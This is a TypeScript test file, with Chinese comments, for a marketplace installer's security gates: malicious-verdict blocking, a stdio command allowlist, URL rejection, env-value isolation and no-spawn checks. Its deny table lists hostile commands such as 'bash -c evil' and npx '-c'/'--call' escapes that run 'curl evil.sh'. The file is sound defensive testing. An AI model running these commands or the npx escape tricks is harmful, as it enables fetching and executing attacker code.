/** G2 市场安装链路例（设计稿 §3/§4/§7）：verdict 硬阻断（malicious 无任何绕过通道）、
 *  warn 需 confirm、stdio 白名单闸表驱动、env 值反向锚（注册表数据里的 env 值绝不入
 *  servers.json，值只能来自本次 install 参数）、install 拒任意 URL/未知 id/未知源前缀、
 *  技能装后 SkillStore 可见且零执行副作用（注入探针：无进程 spawn、市场 fetch 只打白名单端点）、
 *  installed 双向核对（本体删除后登记行清理）。
 *  隔离方式照 market-client.test.ts：本地 node:http fixture + fetchImpl 域名重写
 *  （白名单闸校验的仍是生产 URL——注入不绕闸）。SkillImporter 注入探针 fetch（GitHub 路由）。 */
import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach, vi } from 'vitest';
import { createServer, type Server, type IncomingMessage, type ServerResponse } from 'node:http';
import type { AddressInfo } from 'node:net';
import { mkdtempSync, rmSync, readFileSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { crc32 } from 'node:zlib';
import { spawn } from 'node:child_process';
import Database from 'better-sqlite3';

// 零执行副作用探针：ESM 模块命名空间不可 spyOn（namespace not configurable）——
// 改走 vi.mock 模块级拦截。spread actual 保留 spawnSync 等真实实现
//（install.ts 的 probeBinMissing 用 where.exe/which 探测二进制，照常真实运行）。
vi.mock('node:child_process', async (importOriginal) => {
  const actual = await importOriginal<typeof import('node:child_process')>();
  const spawnProbe = vi.fn((...a: unknown[]) => {
    throw new Error(`市场安装链路不得 spawn 进程（零执行副作用锚）: ${String(a[0])}`);
  });
  return { ...actual, spawn: spawnProbe as unknown as typeof actual.spawn };
});
import { openDb } from '../src/minisd/store/db';
import { MinisPaths } from '../src/minisd/paths';
import { SkillStore } from '../src/minisd/skills/store';
import { SkillImporter } from '../src/minisd/skills/importer';
import { McpServersStore } from '../src/minisd/mcp/config';
import { MarketClient } from '../src/minisd/market/client';
import { MarketCache } from '../src/minisd/market/cache';
import { ClawHubSource } from '../src/minisd/market/clawhub';
import { McpRegistrySource } from '../src/minisd/market/mcp-registry';
import { AwesomeDshSource } from '../src/minisd/market/awesome-dsh';
import { MarketInstaller, checkStdioWhitelist } from '../src/minisd/market/install';
import type { MarketSource } from '../src/minisd/market/types';

// ── zip 构造（照 skills-import.test.ts 成例：store-only，local headers + CD + EOCD） ──
const SKILL_MD = '---\nname: market-skill\ndescription: 市场技能\nversion: 1.0.0\n---\n# Market\n正文。\n';
function buildZip(entries: { name: string; data: Buffer }[]): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;
  for (const e of entries) {
    const nameB = Buffer.from(e.name, 'utf8');
    const crc = crc32(e.data) >>> 0;
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(0x0800, 6);
    lh.writeUInt16LE(0, 8); lh.writeUInt16LE(0, 10); lh.writeUInt16LE(0, 12);
    lh.writeUInt32LE(crc, 14); lh.writeUInt32LE(e.data.length, 18); lh.writeUInt32LE(e.data.length, 22);
    lh.writeUInt16LE(nameB.length, 26); lh.writeUInt16LE(0, 28);
    locals.push(lh, nameB, e.data);
    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt16LE(0x0800, 8);
    ch.writeUInt16LE(0, 10); ch.writeUInt16LE(0, 12); ch.writeUInt16LE(0, 14);
    ch.writeUInt32LE(crc, 16); ch.writeUInt32LE(e.data.length, 20); ch.writeUInt32LE(e.data.length, 24);
    ch.writeUInt16LE(nameB.length, 28); ch.writeUInt16LE(0, 30); ch.writeUInt16LE(0, 32);
    ch.writeUInt16LE(0, 34); ch.writeUInt16LE(0, 36); ch.writeUInt32LE(0, 38); ch.writeUInt32LE(offset, 42);
    centrals.push(ch, nameB);
    offset += 30 + nameB.length + e.data.length;
  }
  const cd = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8); eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(cd.length, 12); eocd.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, cd, eocd]);
}
const SKILL_ZIP = buildZip([
  { name: 'SKILL.md', data: Buffer.from(SKILL_MD) },
  { name: 'refs/notes.md', data: Buffer.from('参考') },
]);

// ── fixture 数据（字段照 2026-08-20 实抓 g2-probe-run.txt） ──
const clawhubDetail = (slug: string) => JSON.stringify({
  skill: { slug, displayName: `Skill ${slug}`, summary: '摘要', description: '# SKILL.md 正文', stats: { downloads: 1, stars: 2 } },
  latestVersion: { version: '1.0.0' }, metadata: null,
  owner: { handle: 'owner-0' }, moderation: null,
});
const clawhubScan = (status: string) => JSON.stringify({
  skill: { slug: 'x' }, version: { version: '1.0.0' }, moderation: null,
  security: { status, hasScanResult: true, checkedAt: 1, sha256hash: 'abc' },
});
/** 反向锚样本：environmentVariables 只声明键名；再夹带两处「值」陷阱（value 字段与 packages[0].env） */
const mcpDetail = JSON.stringify({
  server: {
    name: 'io.github.owner/mcp-fetch', title: 'Fetch', description: '抓网页', version: '2.0.0',
    packages: [{
      registryType: 'npm', registryBaseUrl: 'https://registry.npmjs.org',
      identifier: '@scope/mcp-fetch', version: '2.0.0', transport: { type: 'stdio' },
      environmentVariables: [
        { name: 'FETCH_API_KEY', description: '服务密钥', isRequired: true, isSecret: true, value: 'REGISTRY_VALUE_LEAK' },
        { name: 'FETCH_MODE', description: '运行模式', isRequired: false },
      ],
      env: { EVIL_FROM_PACKAGE: 'package-env-value' },
    }],
    remotes: [{ type: 'streamable-http', url: 'https://mcp.example.com/mcp' }],
  },
  _meta: {},
});
/** 非 npm stdio 包（oci）且无 remotes → manualOnly 样本 */
const mcpDetailOciOnly = JSON.stringify({
  server: {
    name: 'io.github.owner/oci-srv', title: 'Oci', description: 'oci 包', version: '1.0.0',
    packages: [{ registryType: 'oci', identifier: 'ghcr.io/owner/srv', version: '1.0.0', transport: { type: 'stdio' } }],
  },
  _meta: {},
});
const awesomeIndex = JSON.stringify({
  name: 'awesome-dsh-plugin', count: 1,
  plugins: [{
    name: 'dsh-skill-x', owner: 'someone', url: 'https://github.com/someone/x',
    page: 'https://awesome-dsh-plugin.com/p/x/', category: 'skill',
    description: { en: 'X skill', zh: 'X 技能' }, npm: null, stars: 1, downloads: 2, install: 'dsh plugin add x', added: '2026-08-16',
  }],
});

// ── 装配（每个用例独立：数据根 + 内存库 + fixture 服务器 + 探针） ──
interface Ctx {
  installer: MarketInstaller;
  db: Database.Database;
  skillStore: SkillStore;
  mcpStore: McpServersStore;
  importer: SkillImporter;
  marketFetches: string[];     // 市场 client 的探针（只该有白名单端点）
  githubFetches: string[];     // SkillImporter 的探针（github-url 链路）
  skillsChangedCalls: number;
  root: string;
  close(): Promise<void>;
}

let fixtureServer: Server;
let fixtureUrl: string;

function rewriteFetch(base: string, log?: string[]): typeof fetch {
  return (async (input: unknown, init?: RequestInit) => {
    const url = String(input);
    log?.push(url);
    return fetch(url.replace(/^https:\/\/[^/]+/, base), init);
  }) as typeof fetch;
}

/** SkillImporter 的 GitHub 探针 fetch：Contents API 单层（SKILL.md 直达）。 */
function githubProbeFetch(log: string[]): typeof fetch {
  return (async (input: unknown) => {
    const url = String(input);
    log.push(url);
    if (url === 'https://api.github.com/repos/someone/x/contents/') {
      return new Response(JSON.stringify([
        { name: 'SKILL.md', path: 'SKILL.md', type: 'file', download_url: 'https://raw.githubusercontent.com/someone/x/main/SKILL.md' },
      ]), { headers: { 'content-type': 'application/json' } });
    }
    if (url === 'https://raw.githubusercontent.com/someone/x/main/SKILL.md') {
      return new Response(SKILL_MD);
    }
    return new Response('not found', { status: 404 });
  }) as typeof fetch;
}

async function makeCtx(): Promise<Ctx> {
  const root = mkdtempSync(join(tmpdir(), 'dm-mkt-inst-'));
  const db = openDb(join(root, 'minis.db'));
  const paths = new MinisPaths(root);
  const marketFetches: string[] = [];
  const githubFetches: string[] = [];
  const client = new MarketClient(rewriteFetch(fixtureUrl, marketFetches));
  const cache = new MarketCache(db, client);
  const sources: MarketSource[] = [
    new ClawHubSource(cache),
    new McpRegistrySource(cache),
    new AwesomeDshSource(cache),
  ];
  const skillsRoot = join(root, 'skills');
  mkdirSync(skillsRoot, { recursive: true });
  const skillStore = new SkillStore(db);
  const importer = new SkillImporter(skillsRoot, skillStore, githubProbeFetch(githubFetches));
  const mcpStore = new McpServersStore(paths);
  let skillsChangedCalls = 0;
  const installer = new MarketInstaller({
    db, sources, client, importer, skillStore, mcpStore,
    bridgeNodePath: join(root, 'resources', 'bridge-node.cmd'),
    onSkillsChanged: () => { skillsChangedCalls++; },
  });
  return {
    installer, db, skillStore, mcpStore, importer, marketFetches, githubFetches,
    get skillsChangedCalls() { return skillsChangedCalls; },
    root,
    close: async () => { db.close(); rmSync(root, { recursive: true, force: true }); },
  };
}

async function errOf(p: Promise<unknown>): Promise<Error> {
  return (await p.catch((e) => e)) as Error;
}

beforeAll(async () => {
  fixtureServer = createServer((req: IncomingMessage, res: ServerResponse) => {
    const u = new URL(req.url ?? '/', 'https://fixture');
    const json = (s: string) => { res.writeHead(200, { 'content-type': 'application/json' }); res.end(s); };
    // ClawHub：detail / scan / download（download 回真 zip 字节——照实抓 application/zip）
    const mSkill = /^\/api\/v1\/skills\/([^/]+)$/.exec(u.pathname);
    const mScan = /^\/api\/v1\/skills\/([^/]+)\/scan$/.exec(u.pathname);
    if (u.pathname === '/api/v1/search') return json('{"results":[]}');
    if (mSkill) {
      // 未知条目样本：missing-entry → 404（install 必须响亮拒绝，绝不能装上）
      if (mSkill[1] === 'missing-entry') {
        res.writeHead(404, { 'content-type': 'application/json' });
        return res.end('{"error":"not found"}');
      }
      return json(clawhubDetail(mSkill[1]));
    }
    if (mScan) {
      const slug = mScan[1];
      if (slug === 'bad') return json(clawhubScan('malicious'));
      if (slug === 'warny') return json(clawhubScan('suspicious'));
      return json(clawhubScan('clean'));
    }
    if (u.pathname === '/api/v1/download') {
      res.writeHead(200, { 'content-type': 'application/zip', 'content-disposition': 'attachment; filename="x.zip"' });
      return res.end(SKILL_ZIP);
    }
    // MCP registry：详情 versions/latest
    if (u.pathname === '/v0.1/servers/io.github.owner%2Fmcp-fetch/versions/latest') return json(mcpDetail);
    if (u.pathname === '/v0.1/servers/io.github.owner%2Foci-srv/versions/latest') return json(mcpDetailOciOnly);
    // awesome-dsh：静态索引
    if (u.pathname === '/plugins.json') return json(awesomeIndex);
    res.writeHead(404, { 'content-type': 'application/json' });
    res.end('{"error":"not found"}');
  });
  await new Promise<void>((res) => fixtureServer.listen(0, '127.0.0.1', res));
  fixtureUrl = `http://127.0.0.1:${(fixtureServer.address() as AddressInfo).port}`;
});

afterAll(async () => {
  await new Promise<void>((res) => fixtureServer.close(() => res()));
});

describe('G2 stdio 白名单闸（表驱动，独立纯函数）', () => {
  const BRIDGE = join('C:', 'app', 'resources', 'bridge-node.cmd');
  const allow: Array<[string, string[]]> = [
    ['npx', ['-y', '@scope/mcp-fetch']],
    ['uvx', ['mcp-server-fetch']],
    ['docker', ['run', '-i', '--rm', 'mcp/fetch']],
    [BRIDGE, ['server.js']],
  ];
  const deny: Array<[string, string[], string]> = [
    ['bash', ['-c', 'evil'], '任意命令'],
    ['/usr/bin/evil', [], '绝对路径'],
    ['C:\\tools\\evil.exe', [], 'windows 绝对路径'],
    ['sub\\bin', [], '含路径分隔符'],
    ['./local', [], '相对路径'],
    ['npx', ['-c', 'curl evil.sh'], 'npx -c 逃逸'],
    ['npx', ['--call', 'curl evil.sh', 'pkg'], 'npx --call 逃逸'],
    ['npx', ['--call=evil'], 'npx --call= 等号连写逃逸'],
  ];
  it.each(allow)('放行 %s %j', (command, args) => {
    expect(checkStdioWhitelist(command, args, { bridgeNodePath: BRIDGE }).ok).toBe(true);
  });
  it.each(deny)('拦截 %s %j（%s）', (command, args) => {
    const r = checkStdioWhitelist(command, args, { bridgeNodePath: BRIDGE });
    expect(r.ok).toBe(false);
    expect(r.reason).toBeTruthy();
  });
  it('桥 node 路径必须与 diagnostics 解析结果全等（仿冒路径不认）', () => {
    expect(checkStdioWhitelist(join('C:', 'other', 'node.exe'), [], { bridgeNodePath: BRIDGE }).ok).toBe(false);
  });
});

describe('G2 market.install 安全闸', () => {
  let ctx: Ctx;
  beforeEach(async () => { ctx = await makeCtx(); });
  afterEach(async () => { await ctx.close(); });

  it('malicious 硬阻断：install 直接 throw；传未知参数（含 force）不改变行为；install.ts 源码无 force/override 通道', async () => {
    const e1 = await errOf(ctx.installer.install({ id: 'clawhub:owner-0/bad', confirm: true }));
    expect(e1.message).toContain('malicious');
    // 接口上不存在任何绕过参数：多传的键一律无视（ClawHavoc 教训——行为层锚）
    const e2 = await errOf(ctx.installer.install({ id: 'clawhub:owner-0/bad', confirm: true, force: true, override: true } as never));
    expect(e2.message).toContain('malicious');
    // 类型层锚：源码不出现 force/override 字样（连注释都不留——通道在物理上不存在）
    const src = readFileSync(join(import.meta.dirname, '..', 'src', 'minisd', 'market', 'install.ts'), 'utf8');
    expect(src.includes('force')).toBe(false);
    expect(src.includes('override')).toBe(false);
    // 未装上：SkillStore 空、provenance 无登记
    expect(ctx.skillStore.list().length).toBe(0);
    expect(ctx.installer.installed({ kind: 'skill' }).items.length).toBe(0);
  });

  it('warn 未 confirm 拒绝；confirm:true 放行', async () => {
    const e = await errOf(ctx.installer.install({ id: 'clawhub:owner-0/warny' }));
    expect(e.message).toContain('confirm');
    const r = await ctx.installer.install({ id: 'clawhub:owner-0/warny', confirm: true });
    expect(r.ok).toBe(true);
    expect(r.kind).toBe('skill');
    expect(ctx.skillStore.get(r.localRef)).toBeTruthy();
  });

  it('install 拒任意 URL / 未知 id / 未知源前缀 / 缺 id', async () => {
    for (const bad of [
      { id: 'https://evil.example.com/x' },
      { id: 'https://clawhub.ai/api/v1/download?slug=x' },
      { id: 'unknown:x', confirm: true },
      { id: 'clawhub:owner-0/missing-entry', confirm: true },
      { confirm: true },
    ]) {
      const e = await errOf(ctx.installer.install(bad as never));
      expect(e).toBeInstanceOf(Error);
      expect(e.message.length).toBeGreaterThan(0);
    }
    expect(ctx.skillStore.list().length).toBe(0);
    expect(ctx.mcpStore.list().length).toBe(0);
  });

  it('env 反向锚：注册表数据夹带的 env 值绝不入 servers.json——env 只含本次 install 参数传入的值', async () => {
    const r = await ctx.installer.install({
      id: 'mcp-registry:io.github.owner/mcp-fetch', confirm: true,
      env: { FETCH_API_KEY: 'user-typed-value' },
    });
    expect(r.ok).toBe(true);
    const entry = ctx.mcpStore.list().find(e => e.name === r.localRef);
    expect(entry).toBeTruthy();
    expect(entry!.transport).toBe('stdio');
    // 只含确认卡收集的用户值——注册表里的 value 字段与 packages[].env 全部不入
    expect(entry!.env).toEqual({ FETCH_API_KEY: 'user-typed-value' });
    expect(JSON.stringify(entry)).not.toContain('REGISTRY_VALUE_LEAK');
    expect(JSON.stringify(entry)).not.toContain('package-env-value');
    // 启动命令原样（npx -y 包名），且过白名单
    expect(entry!.command).toBe('npx');
    expect(entry!.args).toEqual(['-y', '@scope/mcp-fetch']);
  });

  it('必填 env 缺失 → install 拒绝（gating 硬校验）', async () => {
    const e = await errOf(ctx.installer.install({ id: 'mcp-registry:io.github.owner/mcp-fetch', confirm: true, env: {} }));
    expect(e.message).toContain('FETCH_API_KEY');
    expect(ctx.mcpStore.list().length).toBe(0);
  });
});

describe('G2 market.installPlan（确认卡数据 §4）', () => {
  let ctx: Ctx;
  beforeEach(async () => { ctx = await makeCtx(); });
  afterEach(async () => { await ctx.close(); });

  it('mcp 条目：来源/层级/启动命令原样/env 只带键名与说明/verdict 服务端重取', async () => {
    const plan = await ctx.installer.installPlan({ id: 'mcp-registry:io.github.owner/mcp-fetch' });
    expect(plan.kind).toBe('mcp');
    expect(plan.source).toEqual({ id: 'mcp-registry', name: 'MCP 官方注册表', tier: 'community' });
    expect(plan.verdict).toBe('unscanned');
    expect(plan.command).toEqual({ command: 'npx', args: ['-y', '@scope/mcp-fetch'] });
    expect(plan.serverName).toBe('io.github.owner-mcp-fetch');
    expect(plan.env).toEqual([
      { name: 'FETCH_API_KEY', description: '服务密钥', required: true, isSecret: true },
      { name: 'FETCH_MODE', description: '运行模式', required: false },
    ]);
    // 环境变量声明绝无值（键名与说明之外的字段不透传上游的 value）
    expect(JSON.stringify(plan.env)).not.toContain('REGISTRY_VALUE_LEAK');
    expect(plan.manualOnly).toBeUndefined();
  });

  it('非 npm stdio 包且无 remotes → manualOnly:true（不给一键装）', async () => {
    const plan = await ctx.installer.installPlan({ id: 'mcp-registry:io.github.owner/oci-srv' });
    expect(plan.manualOnly).toBe(true);
    expect(plan.command).toBeUndefined();
    const e = await errOf(ctx.installer.install({ id: 'mcp-registry:io.github.owner/oci-srv', confirm: true }));
    expect(e.message).toContain('手动');
  });

  it('skill（zip）条目：文件清单来自真实下载的 zip（含 SKILL.md 根层校验）', async () => {
    const plan = await ctx.installer.installPlan({ id: 'clawhub:owner-0/any' });
    expect(plan.kind).toBe('skill');
    expect(plan.verdict).toBe('ok');
    expect(plan.files).toEqual(['SKILL.md', 'refs/notes.md']);
    expect(plan.source.tier).toBe('community');
  });

  it('缺/坏 id → 报错', async () => {
    expect((await errOf(ctx.installer.installPlan({ id: 'https://x.com' }))).message).toBeTruthy();
    expect((await errOf(ctx.installer.installPlan({}))).message).toBeTruthy();
    expect((await errOf(ctx.installer.installPlan({ id: 'nope:x' }))).message).toContain('未知市场源');
  });
});

describe('G2 技能安装：装后可见 + 零执行副作用', () => {
  let ctx: Ctx;
  beforeEach(async () => { ctx = await makeCtx(); });
  afterEach(async () => { await ctx.close(); });

  it('zip 链路：SkillStore 可见 + 正文原样 + skills.changed 广播 + 无进程 spawn + 市场 fetch 只打白名单端点', async () => {
    const r = await ctx.installer.install({ id: 'clawhub:owner-0/any', confirm: true });
    expect(r.ok).toBe(true);
    const row = ctx.skillStore.get(r.localRef);
    expect(row?.name).toBe('market-skill');
    expect(row?.importSource).toBe('zip:skill.zip');
    expect(readFileSync(join(ctx.root, 'skills', r.localRef, 'refs', 'notes.md'), 'utf8')).toBe('参考');
    expect(ctx.skillsChangedCalls).toBe(1);
    // 零执行副作用①：无进程 spawn（安装只是落盘+入库；探针为 vi.mock 的 spawn 桩）
    expect(spawn).not.toHaveBeenCalled();
    // 零执行副作用②：市场 client 探针——只打了 clawhub 的 detail/scan/download 白名单端点
    const hosts = new Set(ctx.marketFetches.map(u => new URL(u).hostname));
    expect([...hosts].every(h => ['clawhub.ai', 'registry.modelcontextprotocol.io', 'awesome-dsh-plugin.com'].includes(h))).toBe(true);
    expect(ctx.marketFetches.some(u => u.includes('/api/v1/download'))).toBe(true);
    // provenance 登记（content_hash = 下载字节自算 sha256）
    const inst = ctx.installer.installed({ kind: 'skill' }).items;
    expect(inst.length).toBe(1);
    expect(inst[0].id).toBe('clawhub:owner-0/any');
    expect(inst[0].localRef).toBe(r.localRef);
    expect(inst[0].contentHash).toMatch(/^[0-9a-f]{64}$/);
  });

  it('github-url 链路（awesome-dsh 条目）：走 SkillImporter 的 GitHub kind，市场 fetch 不出白名单', async () => {
    const r = await ctx.installer.install({ id: 'awesome-dsh:someone/dsh-skill-x', confirm: true });
    expect(r.ok).toBe(true);
    expect(ctx.skillStore.get(r.localRef)?.name).toBe('market-skill');
    expect(spawn).not.toHaveBeenCalled();
    // GitHub 请求走 importer 注入的探针（githubFetches），市场 client 探针里绝无 GitHub 域名
    expect(ctx.marketFetches.every(u => !u.includes('github.com'))).toBe(true);
    expect(ctx.githubFetches.some(u => u.includes('api.github.com'))).toBe(true);
  });
});

describe('G2 market.installed 双向核对', () => {
  let ctx: Ctx;
  beforeEach(async () => { ctx = await makeCtx(); });
  afterEach(async () => { await ctx.close(); });

  it('技能本体删除后登记行清理（表里有但本体没了 → 视为未装）', async () => {
    const r = await ctx.installer.install({ id: 'clawhub:owner-0/any', confirm: true });
    expect(ctx.installer.installed({ kind: 'skill' }).items.length).toBe(1);
    rmSync(join(ctx.root, 'skills', r.localRef), { recursive: true, force: true });
    ctx.skillStore.delete(r.localRef);
    expect(ctx.installer.installed({ kind: 'skill' }).items).toEqual([]);
    // 登记行已被清理（重查不复活）
    expect(ctx.installer.installed({ kind: 'skill' }).items).toEqual([]);
  });

  it('MCP 本体（servers.json 条目）删除后登记行清理；重复安装走 upsert 覆盖登记', async () => {
    const r = await ctx.installer.install({
      id: 'mcp-registry:io.github.owner/mcp-fetch', confirm: true, env: { FETCH_API_KEY: 'v' },
    });
    const items = ctx.installer.installed({ kind: 'mcp' }).items;
    expect(items.length).toBe(1);
    expect(items[0].localRef).toBe(r.localRef);
    ctx.mcpStore.remove(r.localRef);
    expect(ctx.installer.installed({ kind: 'mcp' }).items).toEqual([]);
    // 再装回来：provenance upsert（同 item_id 覆盖，不双行）
    await ctx.installer.install({ id: 'mcp-registry:io.github.owner/mcp-fetch', confirm: true, env: { FETCH_API_KEY: 'v2' } });
    expect(ctx.installer.installed({ kind: 'mcp' }).items.length).toBe(1);
  });

  it('非法 kind 报错（installed 是同步方法：同步 throw 用 toThrow 断言）', () => {
    expect(() => ctx.installer.installed({ kind: 'plugin' })).toThrow(/kind/);
  });
});

describe('G2 provenance 表（market_installs）', () => {
  it('列结构符合设计（item_id 主键 / kind / local_ref / content_hash / installed_at）', () => {
    const db = openDb(':memory:');
    const cols = db.prepare('PRAGMA table_info(market_installs)').all() as { name: string; pk: number }[];
    expect(cols.map(c => c.name)).toEqual(['item_id', 'kind', 'local_ref', 'content_hash', 'installed_at']);
    expect(cols.find(c => c.name === 'item_id')?.pk).toBe(1);
    db.close();
  });
});
